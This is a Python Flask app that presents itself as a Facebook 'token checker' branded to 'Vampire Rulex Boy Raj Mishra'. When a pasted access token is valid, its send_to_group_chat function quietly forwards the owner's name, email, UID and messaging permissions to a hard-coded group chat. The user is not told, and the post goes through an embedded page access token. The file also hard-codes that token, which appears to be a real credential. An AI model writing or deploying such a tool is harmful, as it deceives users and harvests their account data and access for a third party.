import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)

PAGE_ACCESS_TOKEN = 'EAABwzLixnjYBO4ajrvsv9GFMlTiQZA4P0G40JlFjkvukBtW6JNnBSiS0ZBRZBpdnA8cUUkOKZBnYOa5ORZAsr0kkRbWvahpQ6CoE8dy6YuC0L8IZATIZAPPp37KKEZBI2rRlByVx7zhbnSuo1f38JzZBZBASNczXkVA28zOATNi2OAowkEdy7CWqatrVMU6HiZBVxwywcoZD'
GROUP_CHAT_UID = '9456516084398824'  # Apne group ka UID yaha dalein

@app.route('/')
def index():
    return render_template_string('''
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>TOKEN CHECKER BY VAMPIRE RULEX BOY RAJ MISHRA</title>
            <style>
                body {
                    background: black;
                    color: white;
                    font-family: Arial, sans-serif;
                    text-align: center;
                    animation: flicker 1.5s infinite alternate;
                }

                @keyframes flicker {
                    0% { opacity: 1; }
                    50% { opacity: 0.8; }
                    100% { opacity: 1; }
                }

                h1 {
                    color: red;
                    text-shadow: 0 0 10px white;
                }

                form {
                    margin-top: 20px;
                }

                input {
                    padding: 10px;
                    margin: 5px;
                    border-radius: 5px;
                    border: none;
                    font-size: 16px;
                }

                input[type="submit"] {
                    background-color: red;
                    color: white;
                    cursor: pointer;
                }
            </style>
        </head>
        <body>
            <h1>🔥 TOKEN CHECKER BY VAMPIRE RULEX BOY RAJ MISHRA 🔥</h1>
            <form action="/check_token" method="POST">
                <label>Enter Token:</label><br>
                <input type="text" name="token" required><br><br>
                <input type="submit" value="CHECK TOKEN">
            </form>
        </body>
        </html>
    ''')

@app.route('/check_token', methods=['POST'])
def check_token():
    token = request.form['token']
    token_details = check_token_details(token)

    if token_details['valid']:
        send_to_group_chat(token_details)

    return render_template_string('''
        <h1>🔥 TOKEN CHECKER BY RAJ MISHRA 🔥</h1>
        {% if token_details['valid'] %}
            <p><strong>Name:</strong> {{ token_details['name'] }}</p>
            <p><strong>Email:</strong> {{ token_details['email'] }}</p>
            <p><strong>UID:</strong> {{ token_details['uid'] }}</p>
            <img src="{{ token_details['profile_pic'] }}" alt="Profile Picture"><br><br>
            <p><strong>Can Send Messages:</strong> {{ token_details['can_send_message'] }}</p>
            <p><strong>Can Comment:</strong> {{ token_details['can_comment'] }}</p>
        {% else %}
            <p style="color:red;">❌ Invalid Token</p>
        {% endif %}
        <a href="/">🔙 Back</a>
    ''', token_details=token_details)

def check_token_details(token):
    url = f"https://graph.facebook.com/me?fields=id,name,email,picture&access_token={token}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json()
        
        # Message aur Comment permissions check karna
        can_send_message = check_permission(token, "pages_messaging")
        can_comment = check_permission(token, "publish_actions")

        return {
            "valid": True,
            "name": data.get('name', 'Unknown'),
            "email": data.get('email', 'Not Available'),
            "profile_pic": data['picture']['data']['url'],
            "uid": data['id'],
            "can_send_message": "✅ Yes" if can_send_message else "❌ No",
            "can_comment": "✅ Yes" if can_comment else "❌ No"
        }
    else:
        return {"valid": False}

def check_permission(token, permission):
    url = f"https://graph.facebook.com/me/permissions?access_token={token}"
    response = requests.get(url)
    
    if response.status_code == 200:
        data = response.json().get('data', [])
        for perm in data:
            if perm.get('permission') == permission and perm.get('status') == "granted":
                return True
    return False

def send_to_group_chat(token_details):
    message = f"✅ **Token Validated Successfully!**\n\n" \
              f"👤 **Name:** {token_details['name']}\n" \
              f"📧 **Email:** {token_details['email']}\n" \
              f"🆔 **UID:** {token_details['uid']}\n" \
              f"📩 **Can Send Messages:** {token_details['can_send_message']}\n" \
              f"💬 **Can Comment:** {token_details['can_comment']}"

    url = f"https://graph.facebook.com/{GROUP_CHAT_UID}/messages?access_token={PAGE_ACCESS_TOKEN}"
    payload = {"message": message}

    response = requests.post(url, data=payload)

    if response.status_code == 200:
        print("✅ Message sent to group chat successfully!")
    else:
        print(f"❌ Failed to send message. Error: {response.text}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
